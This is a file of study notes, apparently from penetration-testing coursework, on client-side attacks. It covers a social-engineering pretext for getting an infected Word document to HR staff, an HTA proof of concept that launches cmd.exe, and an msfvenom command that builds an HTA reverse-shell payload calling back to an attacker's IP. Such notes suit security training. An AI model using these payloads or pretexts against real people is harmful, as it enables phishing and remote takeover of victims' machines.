@@ -1,0 +1,74 @@
+------------------
+NOTES
+------------------
+
+exploitation of client side software such as a browser or email client
+typically involve some sort of deception to trick a user
+do not typically require direct or routable access to the victim's machine
+
+Know your target
+	important to gain insight into the tech being used internally but as easy as WWW or FTP enum
+
+	Passive Info Gathering
+		googling various external corporate IP addresses
+		social media sites revealing computer screens or job postings
+
+	Active Client Information Gathering
+		direct contact with a client
+		targeted email or vishing
+
+		Social Engineering and Client-Side Attacks
+			sending malformed resume to a job posting
+			HR responds saying they cant open the doc
+			call back and ask what version of office they are using
+			say some bs like the resume uses some advanced features like macros
+			send an infected word doc
+
+		Client Fingerprinting
+			sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip
+
+Leveraging HTML applications
+	a file with the extension of .hta instead of .html is treated as an HTML application by Internet Explorer
+
+	Exploring HTML Applications
+		include HTML, BODY, and SCRIPT tags
+		executed outside of the browser and therefore can use legacy and dangerous features that are blocked from within the browser
+
+		-- Example --
+
+		<html>
+		<head>
+
+		<script>
+
+			var c= 'cmd.exe'
+			new ActiveXObject('WScript.Shell').Run(c);
+
+		</script>
+
+		</head>
+		<body>
+
+		<script>
+
+			self.close();
+
+		</script>
+
+		</body>
+		</html>
+
+		move the file into poc.hta and serve w apache
+		client is presented with 2 popups but will run arbitrary code
+
+	HTA Attack in Action
+		use msfvenom to output an hta payload
+			sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
+			runs powershell with a couple flags
+				-nop = do not load the user's default profile
+				-w hidden = do not make a popup window
+				-e = supply a base64 encoded payload
+		need to make sure to serve with apache2 (not py simple server)
+
+Exploiting Microsoft Office
+	Macros and DDE
